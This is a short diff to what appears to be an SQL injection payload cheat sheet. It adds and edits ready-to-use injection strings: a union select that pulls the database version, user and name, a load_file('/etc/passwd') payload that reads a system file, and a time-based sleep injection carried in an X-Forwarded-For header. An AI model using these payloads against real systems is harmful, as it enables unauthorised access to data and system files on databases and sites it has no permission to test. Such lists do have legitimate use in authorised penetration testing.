@@ -8,7 +8,9 @@ ___
 
 ### Examples
 ```sql
-' and 1=2 union all select concat_ws(0x3a,version(),user(),database()) --
+' and 1=2 union all select concat_ws(0x3a,version(),user(),database())--
+
+' and 1=2 union all select load_file('/etc/passwd')--
 
 X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers ✔
 
